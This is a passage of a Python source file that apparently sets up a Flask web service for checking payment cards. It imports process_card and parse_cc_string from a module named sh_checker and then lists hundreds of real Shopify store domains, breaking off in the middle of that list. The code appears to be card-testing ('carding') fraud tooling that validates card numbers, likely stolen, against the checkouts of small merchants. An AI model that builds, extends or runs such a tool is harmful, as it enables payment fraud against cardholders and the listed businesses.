import asyncio
import time
import sys
import os
import random
from flask import Flask, request, Response

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from sh_checker import process_card, parse_cc_string, extract_clean_response

app = Flask(__name__)

SITES = [
    "034c76-74-2.myshopify.com", "08e43c-5a.myshopify.com", "112-must-have.myshopify.com",
    "132461-96.myshopify.com", "1thrive.myshopify.com", "25d3e7-3.myshopify.com",
    "3b55e2-fa.myshopify.com", "3d2210-60.myshopify.com", "43andcompany.myshopify.com",
    "48longstems-com.myshopify.com", "5c8e14-2.myshopify.com", "5de829-2.myshopify.com",
    "683716-61.myshopify.com", "7c1a1e.myshopify.com", "7idp.myshopify.com",
    "8bd59e-de.myshopify.com", "8cfda4.myshopify.com", "907119-3.myshopify.com",
    "99b5bc-df.myshopify.com", "a4y1xd-3e.myshopify.com", "a93ee5-3.myshopify.com",
    "adapted-4-special-ed.myshopify.com", "addiesdivewatches.myshopify.com", "admiralrow.myshopify.com",
    "adornments-lady-of-the-lake.myshopify.com", "aerogenics.myshopify.com", "affordable-motor-home-rentals.myshopify.com",
    "afsound.myshopify.com", "alcove-shop.myshopify.com", "alice-draws-the-line.myshopify.com",
    "allpet-solutions.myshopify.com", "allpondsolutions.myshopify.com", "aloracosmetics.myshopify.com",
    "alpartyballoons.com", "alpine-imports.myshopify.com", "alpine-luddites.myshopify.com",
    "als-garden-and-home.myshopify.com", "alterre.myshopify.com", "ama-brushh.myshopify.com",
    "amanda-coleman-jewellery.myshopify.com", "amara-organic-foods.myshopify.com", "amazonmirrors.myshopify.com",
    "ame-by-m.myshopify.com", "american-farmhouse-bowls.myshopify.com", "americanblossomlinens.myshopify.com",
    "amika-1.myshopify.com", "amos-products.myshopify.com", "ample-store-co-uk.myshopify.com",
    "amplifycosmetics.myshopify.com", "anotherseasonwaco.myshopify.com", "apkbridal.myshopify.com",
    "arctic-fox.myshopify.com", "aribikes.myshopify.com", "art-inspired-ltd.myshopify.com",
    "art-supplies-australia.myshopify.com", "artboxvan.myshopify.com", "artkal-beads-store.myshopify.com",
    "asano-taiko-u-s.myshopify.com", "ashlie-craft.myshopify.com", "aspenjay.myshopify.com",
    "assemblynewyork.myshopify.com", "astrography.myshopify.com", "athrbeauty.com",
    "attarwalas-4438.myshopify.com", "au-vodka.myshopify.com", "aubremworthwool.myshopify.com",
    "auntflow.myshopify.com", "aurate.myshopify.com", "australian-deer-association.myshopify.com",
    "avorium.myshopify.com", "awaydaysfootball.com", "b-eco-family.myshopify.com",
    "b-s-activewear.myshopify.com", "b2976e.myshopify.com", "b7-performance.myshopify.com",
    "b87efb-b5.myshopify.com", "babydotsenpaix.myshopify.com", "badibidu-by-cat-regi.myshopify.com",
    "badminton-click.myshopify.com", "bafd2a.myshopify.com", "bailey-of-sheffield-store.myshopify.com",
    "bajaboard2.myshopify.com", "bakery-bops.myshopify.com", "balloons-and-paper-inc-2.myshopify.com",
    "bambuubrush.myshopify.com", "baraka-gems.myshopify.com", "bassettsblends.myshopify.com",
    "bauer-media-group.myshopify.com", "be-true-western.myshopify.com", "beadsdisco.myshopify.com",
    "beardsgaard.myshopify.com", "beastro.myshopify.com", "beckagriffin.myshopify.com",
    "beddys.myshopify.com", "bee-keeping-gear.myshopify.com", "beechmore-books.myshopify.com",
    "beginningboutique-nz.myshopify.com", "beistraveleurope.myshopify.com", "beistraveluk.myshopify.com",
    "bellaandoliversoap.com", "bellabronzetan.myshopify.com", "bellwoodsbrewery.myshopify.com",
    "bend-and-snap.myshopify.com", "bentley-jewellery.myshopify.com", "berle.myshopify.com",
    "beryllina.myshopify.com", "bethanyjoyart.com", "better-fragrances.myshopify.com",
    "bfcosmetics.myshopify.com", "biancalorenne-co-nz.myshopify.com", "big-little-dogs.myshopify.com",
    "biglaces.myshopify.com", "binky-bro.myshopify.com", "bisous-lingerie.myshopify.com",
    "black-optical.myshopify.com", "black-powder-coffee.myshopify.com", "black-white-coffee.myshopify.com",
    "blackflys.myshopify.com", "blanks-blanks-baby.myshopify.com", "blazefiredesigns.myshopify.com",
    "blubohoo.myshopify.com", "blueblockers.myshopify.com", "blueteesgolf.myshopify.com",
    "bluntpower.myshopify.com", "boardwalk-numismatics.myshopify.com", "boavistacircular.myshopify.com",
    "bodybest-ca.myshopify.com", "bomzers-bargains.myshopify.com", "boodywearus.myshopify.com",
    "boothbymail.myshopify.com", "booty-band-co-au.myshopify.com", "borealrescue.myshopify.com",
    "bossbudgetco.myshopify.com", "boujeebloomdesignco.myshopify.com", "bprimal.myshopify.com",
    "brandon-blackwood-new-york.myshopify.com", "breakout-incorporated.myshopify.com", "bright-stem.myshopify.com",
    "brightside-minneapolis.myshopify.com", "briogeo-hair-care.myshopify.com", "brodandtaylor.com",
    "brooklyn-tweed.myshopify.com", "brunekitchen.com", "bryson-city-outdoors.myshopify.com",
    "btr-bar.myshopify.com", "bulletmole1.myshopify.com", "bundle-monster.myshopify.com",
    "bungubox.shop", "butter-baked-goods.myshopify.com", "by-lohn.myshopify.com",
    "by-sophia-lee.myshopify.com", "bychari.myshopify.com", "bydeeau.myshopify.com",
    "c0d585.myshopify.com", "c2c6d6.myshopify.com", "c3powersports.myshopify.com",
    "c599c0.myshopify.com", "cabine-monde.myshopify.com", "cabinetsndoors-dev.myshopify.com",
    "caffeine-and-kilos-inc.myshopify.com", "calithe.myshopify.com", "camden-miniature-steam-services.myshopify.com",
    "camilynbeth.com", "campus-tees-official.myshopify.com", "candy-mail-uk.myshopify.com",
    "canna-river.myshopify.com", "caterkids.myshopify.com", "ce-institute.myshopify.com",
    "chainsofstyle.myshopify.com", "challengecoinnation.com", "chandelierslife.myshopify.com",
    "chapterorganics.myshopify.com", "charityhowto.myshopify.com", "charliemckay.myshopify.com",
    "chasing-foxes-store.myshopify.com", "chazdean.com", "cheaper-online-co-uk.myshopify.com",
    "cheapfabricsuk.myshopify.com", "cherry-collectables.myshopify.com", "chesterfieldbags.myshopify.com",
    "chibimikichan.myshopify.com", "chicologyinc.myshopify.com", "chikahisastudio.myshopify.com",
    "childfund.myshopify.com", "childperfume.myshopify.com", "chlobo-uk.myshopify.com",
    "choiceflooringllc.myshopify.com", "chromebattery.myshopify.com", "chunkynz.myshopify.com",
    "cibowares.myshopify.com", "cinqasept.myshopify.com", "cissy-wears.myshopify.com",
    "city-mattress.myshopify.com", "cjstickershop.com", "clara-and-macy.myshopify.com",
    "clara-sunwoo.myshopify.com", "clark-products-nz.myshopify.com", "classic-car-performance.myshopify.com",
    "classique-carries-geneve.myshopify.com", "cleaning-products-uk.myshopify.com", "clionadh-cosmetics.myshopify.com",
    "cliphair-uk.myshopify.com", "close-to-your-heart-dev.myshopify.com", "clubit-co-uk.myshopify.com",
    "cluse-store-dev.myshopify.com", "coat-of-arms-nyc.myshopify.com", "cocofranscais-com.myshopify.com",
    "cocomatsnmore.myshopify.com", "coconu.com", "cocotiquestore.myshopify.com",
    "codeword-hats.myshopify.com", "coffin-world.myshopify.com", "collectiveminds-uk.myshopify.com",
    "colnart.myshopify.com", "color-cord-dev.myshopify.com", "colorfull-plates-kids-tableware-and-lifestyle.myshopify.com",
    "combatbet.myshopify.com", "comiso-coffee.myshopify.com", "commercial-real-estate-success-strategies.myshopify.com",
    "commodityeu.myshopify.com", "complete-unity-yoga.myshopify.com", "concourse-golf.myshopify.com",
    "conscious-alliance-1.myshopify.com", "container-one.myshopify.com", "cookanyday.myshopify.com",
    "cookiegood.myshopify.com", "coral-and-ink.myshopify.com", "corter.myshopify.com",
    "corvetteguys.myshopify.com", "cosy-candles-uk.myshopify.com", "cosys-castles.myshopify.com",
    "cote-cache.myshopify.com", "coteriebabyinc.myshopify.com", "cotton-bag-co.myshopify.com",
    "cottonwood-gift-co.myshopify.com", "coucou-boston.myshopify.com", "country-creek-llc.myshopify.com",
    "countryfields.myshopify.com", "countrylivingmarketplace.myshopify.com", "coveryourwall.myshopify.com",
    "cowsandcrayons.com", "cr-hut.myshopify.com", "craftbuddy-shop.myshopify.com",
    "crafty-kylies-facebook-store.myshopify.com", "cramilo-sunglasses.myshopify.com", "crane-and-canopy.myshopify.com",
    "crates2u-2.myshopify.com", "crazy-catch-uk.myshopify.com", "crazyvictor.myshopify.com",
    "creating-the-difference.myshopify.com", "creative-paradigm-llc.myshopify.com", "crockett-and-jones-row.myshopify.com",
    "crunchy-organics.myshopify.com", "crupi-bmx.myshopify.com", "crushgrind.myshopify.com",
    "crystalbarsoap.com", "crystals-healing-shop.myshopify.com", "crystals-newagestore.myshopify.com",
    "crystalum.myshopify.com", "crystalynkae.myshopify.com", "csg-unicorner.myshopify.com",
    "ctp2.myshopify.com", "cubby-bakehouse.myshopify.com", "cult-glitter.myshopify.com",
    "cultdesignau.myshopify.com", "cuppacakes.myshopify.com", "curlsmith.com",
    "curlsmith.myshopify.com", "curoie.com", "curtainsdirect2u.myshopify.com",
    "custom-collection-cases.myshopify.com", "custom-cowboy-shop.myshopify.com", "cutilabs-3.myshopify.com",
    "cwmenswear.myshopify.com", "cycleme-tots.myshopify.com", "cyclopesco.myshopify.com",
    "d-design-6303.myshopify.com", "d34037.myshopify.com", "d6aa29.myshopify.com",
    "d73906-8c.myshopify.com", "d80ca4-5.myshopify.com", "d8adf0-6.myshopify.com",
    "d90ec2-2.myshopify.com", "d95ccc.myshopify.com", "daal-furniture.myshopify.com",
    "daily-shakes.myshopify.com", "daily-stoic-prints.myshopify.com", "dalstrong.myshopify.com",
    "dan-coyle.myshopify.com", "dani-barbe.myshopify.com", "danieltaywh.myshopify.com",
    "danilo-promotions.myshopify.com", "dannys-wine-beer-supplies.myshopify.com", "dapper-boi-store.myshopify.com",
    "davidaugustinc.myshopify.com", "davines-usa.myshopify.com", "dbs838.myshopify.com",
    "dd7b55.myshopify.com", "dealslabau.myshopify.com", "dean-accessories.myshopify.com",
    "debeauvoir-deli.myshopify.com", "deboerwetsuits.myshopify.com", "delaware-business-incorporators-inc.myshopify.com",
    "delilah-grace-interiors.myshopify.com", "deloasquiltshop.com", "denise-albright.myshopify.com",
    "derm-institute-2.myshopify.com", "designmehair.myshopify.com", "designsbyaymara.myshopify.com",
    "detour-sunglasses.myshopify.com", "dffde8-3.myshopify.com", "diapersdirect.myshopify.com",
    "dirt-cheep-music.myshopify.com", "disegno-fine-jewellery.myshopify.com", "diva-boutique-online.myshopify.com",
    "divahglaminc.myshopify.com", "doctoraromas.myshopify.com", "don-vassie-decanters.myshopify.com",
    "donna-b-collection.myshopify.com", "dons-liquors-wine.myshopify.com", "dopeslimes.myshopify.com",
    "down-low-creations.myshopify.com", "down-under-box.myshopify.com", "dpaw.myshopify.com",
    "dream-house-photography.myshopify.com", "dreams-and-rainbows.myshopify.com", "drinkbrez.myshopify.com",
    "dsee.myshopify.com", "ducky-days.myshopify.com", "dungeons-by-dan.myshopify.com",
    "dwfc-online-shop.myshopify.com", "dws-online.myshopify.com", "dyper.com",
    "e-agronomy.myshopify.com", "easy-pickins2.myshopify.com", "eatbobos.myshopify.com",
    "eatpmp.myshopify.com", "ebb-and-thread.myshopify.com", "eby-by-sofia-vergara.myshopify.com",
    "ecfc-2.myshopify.com", "eco-worthy.myshopify.com", "ecovibestyle.com",
    "edo-performance.myshopify.com", "ee8417.myshopify.com", "elder-statesman.com",
    "elderwise-organics.myshopify.com", "electrode-store.myshopify.com", "elegant-lashes.myshopify.com",
    "elite-fragrance-boutique.myshopify.com", "elittledirect.myshopify.com", "elizabethhunterbooks.myshopify.com",
    "emily-mae-creatives.myshopify.com", "empire-toy-shop.myshopify.com", "emulait.myshopify.com",
    "enchroma.myshopify.com", "endurunce-shop.myshopify.com", "eno-nation.myshopify.com",
    "ensley-and-wells.myshopify.com", "epsilon-pc.myshopify.com", "erics-bumper-store.myshopify.com",
    "esavingsblog.myshopify.com", "escapegame14.myshopify.com", "esr-production.myshopify.com",
    "esssiecare.myshopify.com", "eternalperfumeoils.myshopify.com", "etgb.myshopify.com",
    "ethnotek-bags.myshopify.com", "etrnl.myshopify.com", "evatrends.myshopify.com",
    "evermore-farm.myshopify.com", "everyday-gourmet-coffee.myshopify.com", "exec-pens.myshopify.com",
    "exotic-world-snacks.myshopify.com", "expedition-press.myshopify.com", "expeditionengineering.myshopify.com",
    "f15b00-64.myshopify.com", "f606bf-e9.myshopify.com", "fabric-confetti.myshopify.com",
    "factory21-promotionals.myshopify.com", "faireleatherco.myshopify.com", "faith-uniforms.myshopify.com",
    "fanhq.myshopify.com", "fcpx-full-access.myshopify.com", "fecedy.myshopify.com",
    "feedback-sports.myshopify.com", "fezibo.myshopify.com", "ficus-1573.myshopify.com",
    "figu-portugal.myshopify.com", "filmneverdie-com.myshopify.com", "filteroutlet.myshopify.com",
    "finalbossbundle.myshopify.com", "fine-saratoga-ltd.myshopify.com", "firefly-nature-schooling.myshopify.com",
    "fizzyoral.myshopify.com", "flaire-accessories.myshopify.com", "fleurenz.myshopify.com",
    "flintts-mouth-watering-mints.myshopify.com", "florida-sunseeker.myshopify.com", "flush-packaging.myshopify.com",
    "flyingeyesoptics.myshopify.com", "fomato.myshopify.com", "forest-casualwear.myshopify.com",
    "forever-french-co.myshopify.com", "foreveremdesigns.com", "forgiven-jewelry.myshopify.com",
    "forman-picture-framing.myshopify.com", "fosi-audio.myshopify.com", "four-seasons-hotel-sydney.myshopify.com",
    "fragrancelord-com.myshopify.com", "frame-my-mirror.myshopify.com", "frank-green-au.myshopify.com",
    "frankvignolaguitarlessons.myshopify.com", "free-the-sheep.myshopify.com", "freebeat-fit.myshopify.com",
    "french-sweet.myshopify.com", "fresh-balls.myshopify.com", "funnyfuzzy2021.myshopify.com",
    "funwateroutdoor.myshopify.com", "futurescape-landscaping.myshopify.com", "g-and-b-pro.myshopify.com",
    "g-b-inspirational-greeting-cards-company.myshopify.com", "g-o-a-t-sports-gear.myshopify.com", "galaxies13x.myshopify.com",
    "gametradeuk.myshopify.com", "gcl-centre.myshopify.com", "gearbunch.myshopify.com",
    "gellae.myshopify.com", "gemondouk.myshopify.com", "genius-lab-gear.myshopify.com",
    "geomatters.myshopify.com", "george-rings.myshopify.com", "getevo.myshopify.com",
    "getpressedbysteph.com", "gigi-seasons-1.myshopify.com", "girl-be-brave.myshopify.com",
    "givingtreesnacks.myshopify.com", "glamaholiclifestyle.myshopify.com", "glass-boards-direct.myshopify.com",
    "glen-scotia.myshopify.com", "glia2.myshopify.com", "godess-charms.myshopify.com",
    "gohypo.myshopify.com", "gold-presidents.myshopify.com", "gonzales-party-store.myshopify.com",
    "good-charma.myshopify.com", "graftobian-make-up-company.myshopify.com", "greatbasingraphics.myshopify.com",
    "green-reconnect.myshopify.com", "greenworkstools.myshopify.com", "gregorysgraphics.myshopify.com",
    "grestmobile.myshopify.com", "grey-jam-press.myshopify.com", "greystone.myshopify.com",
    "groovygolfer.myshopify.com", "gspawn.com", "habit-nest.myshopify.com",
    "habox.myshopify.com", "hakuhodo-usa.myshopify.com", "hannah-kyriakou-design.myshopify.com",
    "happy-pett.myshopify.com", "hartford-prints-store.myshopify.com", "hasfit.myshopify.com",
    "haven-mattress.myshopify.com", "hawkwatch-international.myshopify.com", "heatpressnation.myshopify.com",
    "hebrew-type.myshopify.com", "hello-nancy-toys.myshopify.com", "heretic-parfum.myshopify.com",
    "hibiscus-test.myshopify.com", "high5-store.myshopify.com", "highland-2021.myshopify.com",
    "hilary-rhoda.myshopify.com", "hilltop-packs-llc.myshopify.com", "himibike.myshopify.com",
    "hma-labs.myshopify.com", "hobby-land-nz.myshopify.com", "home-county-candle-co.myshopify.com",
    "honeoils.myshopify.com", "honey-babe-clothing.myshopify.com", "hook-tackle.myshopify.com",
    "hueloco.com", "hultafors.myshopify.com", "huntershomegrown.myshopify.com",
    "hunylondon.myshopify.com", "huupe-co.myshopify.com", "hvacr-com.myshopify.com",
    "iceshaker.myshopify.com", "iheybikeca.myshopify.com", "il-argento-usa.myshopify.com",
    "ilikemaps.myshopify.com", "illuminate-vintage.myshopify.com", "imagine-me-stories.myshopify.com",
    "impressums-jewellery.myshopify.com", "industrial-ladder-and-scaffolding-inc.myshopify.com", "info-engraving-keys.myshopify.com",
    "innersense-organic-beauty-inc.myshopify.com", "innovativeconcrete.myshopify.com", "inspired-natural-play-store.myshopify.com",
    "interitower-de.myshopify.com", "internet-toast.myshopify.com", "itsaskin-com.myshopify.com",
    "j-richellejewelry.myshopify.com", "jackmason.myshopify.com", "jadefisher.myshopify.com",
    "janitorial-superstore.myshopify.com", "jasminorganics.myshopify.com", "jazhandmade.myshopify.com",
    "jenn-co.myshopify.com", "jewelsbyhouseofaria.myshopify.com", "jezebel-gallery.myshopify.com",
    "jill-blade.myshopify.com", "joannaczech.myshopify.com", "jooy-only.myshopify.com",
    "journey-frames-9322.myshopify.com", "julie-sinden-handmade.myshopify.com", "juliehanandesign.myshopify.com",
    "justwashroom.myshopify.com", "k-d-mc-fadden-butchers.myshopify.com", "k5-international-beauty-instruments.myshopify.com",
    "karinesultan.myshopify.com", "karla-cosmetics.myshopify.com", "karmic-eyewear.myshopify.com",
    "kathys-table3-0.myshopify.com", "katvr.myshopify.com", "kbobike.myshopify.com",
    "keep-hearing.myshopify.com", "keplin-ecommerce.myshopify.com", "keukabluegifts.myshopify.com",
    "keysmart.myshopify.com", "kfcfoundation.myshopify.com", "kiboubag.com",
    "kids-fair-llc.myshopify.com", "killstar-eu.myshopify.com", "kinkz-hair-products.myshopify.com",
    "kioskgroup.myshopify.com", "kishkesh.myshopify.com", "kmtools.com",
    "knitspot.myshopify.com", "kodama-forest.myshopify.com", "kodiakcakes.myshopify.com",
    "koreessentials.myshopify.com", "kosta-boda-8586.myshopify.com", "kowtowclothing.myshopify.com",
    "kris-nations.myshopify.com", "krisstuition.myshopify.com", "kristallrummet.myshopify.com",
    "kruger-stickers.myshopify.com", "kydexcustoms.myshopify.com", "kyndkits.myshopify.com",
    "la-suite-skincare.myshopify.com", "lace-lab.myshopify.com", "laird-superfood.myshopify.com",
    "landoftheblind.myshopify.com", "larepublicasuperfoods.com", "lash-lounge-by-ann.myshopify.com",
    "lavishshoestring.myshopify.com", "le-mini-macaron-2.myshopify.com", "leather-satchel.myshopify.com",
    "ledlightsworld.myshopify.com", "legacybikepark.com", "legitgrails.com",
    "leicester-wholefoods.myshopify.com", "leluxe-home.myshopify.com", "lesports.myshopify.com",
    "lesvidesanges.myshopify.com", "letterseal.myshopify.com", "levenger.myshopify.com",
    "leviosa-shades.myshopify.com", "life-of-riley-2.myshopify.com", "life-vac-australia.myshopify.com",
    "lifespan-kids.myshopify.com", "liftglucose.myshopify.com", "lindsay-it.myshopify.com",
    "linenloftlakewood.myshopify.com", "little-label-co.myshopify.com", "little-lovies-boutique.myshopify.com",
    "little-mouse-clothing-and-gifts.myshopify.com", "little-prince-london.myshopify.com", "littlestarplans.com",
    "littlevegpatch.myshopify.com", "lively-ghosts.myshopify.com", "livingby-design.myshopify.com",
    "livingearthbeauty.myshopify.com", "livwatches.myshopify.com", "ljmcardiagnostics.myshopify.com",
    "lo-tide-jewelry.myshopify.com", "local-heroes-comics.myshopify.com", "longhouse-dev.myshopify.com",
    "loop-generation.myshopify.com", "lori-wall-beds.myshopify.com", "louisianatrophies.com",
    "love-me-knotshi.myshopify.com", "love-of-earth-co.myshopify.com", "love-sew.com",
    "lovetodream-au.myshopify.com", "lucky-bowler-pro-shop.myshopify.com", "ludusagendercollections.myshopify.com",
    "lumenslp.myshopify.com", "lust-minerals.myshopify.com", "luxemed-medical-supplies.myshopify.com",
    "mabelandjess.com", "made-by-rae.myshopify.com", "made-to-milk.myshopify.com",
    "madeleineholloway.myshopify.com", "madison-mackenzie.myshopify.com", "maejean-vintage-jewelry.myshopify.com",
    "maineventemblems.com", "make-memento.myshopify.com", "makeitlastpatterns.myshopify.com",
    "makerflo-crafts.myshopify.com", "makeshiftwings.myshopify.com", "mama-s-desserts.myshopify.com",
    "marco-lizzy-childrens-clothing.myshopify.com", "marigold-grey-inc.myshopify.com", "martello-alley.myshopify.com",
    "martha-ash.myshopify.com", "matchabar-staging.myshopify.com", "mateina-yerba-mate.myshopify.com",
    "matsuru-canada.myshopify.com", "maximal-power.myshopify.com", "maximum-crafts.myshopify.com",
    "mayabrenner.myshopify.com", "medikate-skincare.myshopify.com", "medusasmakeup.myshopify.com",
    "meindl-australia.myshopify.com", "melin.com", "meow-skateboards.myshopify.com",
    "merishopify.myshopify.com", "merlettenyc.myshopify.com", "miamifruit.myshopify.com",
    "micelare.myshopify.com", "michael-angelos-bakery.myshopify.com", "michael-todd-beauty-2017.myshopify.com",
    "midori-spring.myshopify.com", "midsouthled.myshopify.com", "mighty-skins.myshopify.com",
    "milina-london.myshopify.com", "militadowatch.com", "miller-bros-paint.myshopify.com",
    "milliondollarbabyclassic.myshopify.com", "mishahawaii.myshopify.com", "misports.myshopify.com",
    "mjecomm.myshopify.com", "mme-online.myshopify.com", "mnjohn.com",
    "mobot.myshopify.com", "mod-mex.myshopify.com", "modern-nursery-test-store.myshopify.com",
    "modket.myshopify.com", "modular-closets.myshopify.com", "moissy-fine-jewellery.myshopify.com",
    "mollieandmargo.myshopify.com", "momoslimes.com", "monas-natural-treats.myshopify.com",
    "monkeynmoo.myshopify.com", "monolith-eu.myshopify.com", "monumental-living.myshopify.com",
    "mooala.com", "moogoo-usa.myshopify.com", "moto-stuff-llc.myshopify.com",
    "mountainsidestudio.myshopify.com", "mr-mrs-vintage.myshopify.com", "mulberry-park-silks.myshopify.com",
    "murdycreativeco.myshopify.com", "museum-for-art-in-wood.myshopify.com", "music-otm.myshopify.com",
    "mylash-xo.myshopify.com", "myotakuhouse.myshopify.com", "mysimpleshot.myshopify.com",
    "mysuds2go.com", "nailsmailed.myshopify.com", "name-bubbles.myshopify.com",
    "namemakers.myshopify.com", "nationaltreecompany.myshopify.com", "naturebag.myshopify.com",
    "naturylbynbk.myshopify.com", "navajorug-com.myshopify.com", "ndpr.myshopify.com",
    "ne-student-services.myshopify.com", "nestout.myshopify.com", "nettingpros.com",
    "newpaltz.myshopify.com", "newwebsite2.myshopify.com", "ninja-outdoorsman.myshopify.com",
    "nj-boutique-official.myshopify.com", "nmtcb.myshopify.com", "nock-on-archery.myshopify.com",
    "noirnyc.myshopify.com", "nokaorganics.myshopify.com", "noria.myshopify.com",
    "novita-sg.myshopify.com", "nudestix.myshopify.com", "nutriseeduk.myshopify.com",
    "oasis-house.myshopify.com", "oasisgardennz.myshopify.com", "obviousshirts.myshopify.com",
    "officekoala.myshopify.com", "oh-boy-records.myshopify.com", "oh-its-natural.myshopify.com",
    "ohsofitting.myshopify.com", "olfactif.myshopify.com", "olidestore.myshopify.com",
    "oma-the-label.myshopify.com", "omgkitty.myshopify.com", "ondo-wear.myshopify.com",
    "onetreeplanted-2.myshopify.com", "onlineliquor.com", "onyx-straps-llc.myshopify.com",
    "opv-beauty.myshopify.com", "organic-cotton-plus.myshopify.com", "organizational-wellness-and-learning-systems.myshopify.com",
    "origin-bakery.myshopify.com", "original-metal-signs.myshopify.com", "orvgirlz.myshopify.com",
    "osp-cases.myshopify.com", "ozark-compost-swap.myshopify.com", "packagemint.myshopify.com",
    "padawan-outpost.myshopify.com", "paige-poppe-art.myshopify.com", "paint-mobile.myshopify.com",
    "painted-bayou.myshopify.com", "palace-beauty-galleria.myshopify.com", "papavector.myshopify.com",
    "paper-bag-co-sw.myshopify.com", "paper-plane-designs.myshopify.com", "paper-scissors-craft-blog.myshopify.com",
    "parentgiving.myshopify.com", "paris-hilton-fragrances.myshopify.com", "pashmina-collection.myshopify.com",
    "peaceimagesjewelry.myshopify.com", "peakcocktails.com", "penboutique.myshopify.com",
    "pencil-me-in-shop.myshopify.com", "pencilmeinshop.co.uk", "pente-douce.myshopify.com",
    "permanent-baggage.myshopify.com", "permanent-jewelry-bestie.myshopify.com", "pethstore.myshopify.com",
    "petrolheart-com.myshopify.com", "petsmax-net.myshopify.com", "pfgsports.myshopify.com",
    "phoenixroze.myshopify.com", "pickettlondon.myshopify.com", "picturerailsystems.myshopify.com",
    "pine-cone-gift-shoppe.myshopify.com", "pinkfresh-studio.myshopify.com", "piotrlife.myshopify.com",
    "pixie-hula-hoops-nz.myshopify.com", "planterhomawholesale.com", "playspire.myshopify.com",
    "plus-ultra-bamboo-toothbrushes.myshopify.com", "pompomz.myshopify.com", "poopourri-3.myshopify.com",
    "poor-mans-diesel-com.myshopify.com", "popbeauty.myshopify.com", "poppyhandcraftedpopcorn.myshopify.com",
    "porch-patio-5738.myshopify.com", "pork-king-good.myshopify.com", "portland-pet-food-company.myshopify.com",
    "pot-la-studio.myshopify.com", "pourtions.myshopify.com", "premier-bidet.myshopify.com",
    "premier-kites-designs.myshopify.com", "premium-inks.myshopify.com", "premiumpaints-co-uk.myshopify.com",
    "pressurewashernet.myshopify.com", "pretty-pink-fashion-boutique.myshopify.com", "pretty-simple-music.myshopify.com",
    "prickly-thistle.myshopify.com", "primary-teaching-services-ltd.myshopify.com", "prime-party.myshopify.com",
    "print-centre-group.myshopify.com", "print-panoramics.myshopify.com", "printables-4-learning.myshopify.com",
    "profusion-us.myshopify.com", "progress-jj-europe.myshopify.com", "project-phoebe.myshopify.com",
    "prolandscapelighting.myshopify.com", "provencebeauty.com", "purpleleaf-u-k.myshopify.com",
    "qualyair.myshopify.com", "quarter-horse-coffee-2.myshopify.com", "quayuk.myshopify.com",
    "questnutrition.myshopify.com", "quistel.myshopify.com", "racingelectronics.myshopify.com",
    "rainbowyogatraining.myshopify.com", "raise-them-well.myshopify.com", "randall-pich.myshopify.com",
    "rawgeneration.com", "rawkanvas.myshopify.com", "rawspicebar1.myshopify.com",
    "reaction-tackle.myshopify.com", "reagan-sanai.myshopify.com", "rebel-nell.myshopify.com",
    "rebrandskincare.com", "recapture-beauty.myshopify.com", "red-hot-chili-peppers.myshopify.com",
    "red-paddle-co-en.myshopify.com", "redpepper-cases.myshopify.com", "regent-3-cinemas-masterton.myshopify.com",
    "relentless-tactical.myshopify.com", "reliquiajewerllery-v1.myshopify.com", "rellery.myshopify.com",
    "renewtronics.myshopify.com", "repeaterstore.myshopify.com", "research-rebels-com.myshopify.com",
    "respire.com", "revolution-fibers.myshopify.com", "ricketyrose.co.uk",
    "rifle-paper.myshopify.com", "ripstopshop.myshopify.com", "risottostudio.myshopify.com",
    "rivolta-1883.myshopify.com", "rock-solid-inc.myshopify.com", "rogueindustries.myshopify.com",
    "role4initiative.myshopify.com", "rollingsquare.myshopify.com", "rose-gold-and-black.myshopify.com",
    "rosecityoriginals.com", "rs-guitarworks.myshopify.com", "rubber-plates.myshopify.com",
    "rubiomonocoatusa.myshopify.com", "ruthcharlotteclothing.com", "saar-soleares.myshopify.com",
    "saber-tactical-inc.myshopify.com", "saguaroshoesus.myshopify.com", "samosjewelry.myshopify.com",
    "sampenny1.myshopify.com", "sample-student-essentials.myshopify.com", "sangie-palm-beach.myshopify.com",
    "sarahdrakedesigns.myshopify.com", "sartorialista-amsterdam.myshopify.com", "satchel-page.myshopify.com",
    "savagesilver.myshopify.com", "savannahbananas.myshopify.com", "scam-stuff.myshopify.com",
    "schaesplace.com", "scooch-case.myshopify.com", "scootertrade.myshopify.com",
    "scout-motorcycles.myshopify.com", "sea-and-blossom.myshopify.com", "secretbargainshop.myshopify.com",
    "seek-outdoor.myshopify.com", "selectsoft.myshopify.com", "semen-tanks.myshopify.com",
    "setthehookonline.myshopify.com", "sew-hungryhippie.myshopify.com", "sew-much-minky-and-more.myshopify.com",
    "sferrafinelinens.myshopify.com", "sg-e-readershop.myshopify.com", "sg-perfumess.myshopify.com",
    "sharetea-everett-online.myshopify.com", "shatterproofarchery.myshopify.com", "sheffieldsu.myshopify.com",
    "shiftathleisurewear.com", "shop-ps-boutique.myshopify.com", "shop-rsc.myshopify.com",
    "shop-touchofglambeauty.myshopify.com", "shop.windchillultimate.com", "shopchictochic.myshopify.com",
    "shopgreddy-com.myshopify.com", "shoppixyls.myshopify.com", "shoppriorattire.myshopify.com",
    "shopsenior.myshopify.com", "shopvolashes.myshopify.com", "shorebags.com",
    "sifr-aromatics-singapore.myshopify.com", "simifashions.myshopify.com", "simons-seconds-dev-test.myshopify.com",
    "simply-natural-canada.myshopify.com", "simply-scented-new.myshopify.com", "simplyhammocks.myshopify.com",
    "simplyloveco.myshopify.com", "sin-min-horchata-lip-balm.myshopify.com", "siriusbrand-au.myshopify.com",
    "sirplus-food.myshopify.com", "sisi-uk.myshopify.com", "six-stories.myshopify.com",
    "skateboardingstickers.myshopify.com", "skulls-unlimited-international-inc.myshopify.com", "skywalker-trampolines.myshopify.com",
    "slavonk-hortus.myshopify.com", "smardart.myshopify.com", "smi2021.myshopify.com",
    "smrtft.com", "snackboxusa.myshopify.com", "snogaathletics.myshopify.com",
    "snowandwhitee.myshopify.com", "so-chic-boutique-peoria.myshopify.com", "soektribe.myshopify.com",
    "sofontsy.myshopify.com", "sol-society-scrubs.myshopify.com", "soloeyeware.myshopify.com",
    "somerlap.myshopify.com", "soshebeauty.myshopify.com", "sosoyuk.myshopify.com",
    "southern-anchor-ky.myshopify.com", "space-bathroom.myshopify.com", "spareshut.myshopify.com",
    "spatty-2.myshopify.com", "speaking-of-samantics.myshopify.com", "speedcube.myshopify.com",
    "spicedivine-2.myshopify.com", "spirits-of-france.myshopify.com", "spiritsoffrance.com.au",
    "spyhouse-coffee-roasting-co.myshopify.com", "squire-locks.myshopify.com", "stacked-fabric-company.myshopify.com",
    "startinggardens.myshopify.com", "static-arc.myshopify.com", "stationery-geek.myshopify.com",
    "steamforged-games-us.myshopify.com", "stephanie-gottlieb-fine-jewelry.myshopify.com", "sticker-print-go.myshopify.com",
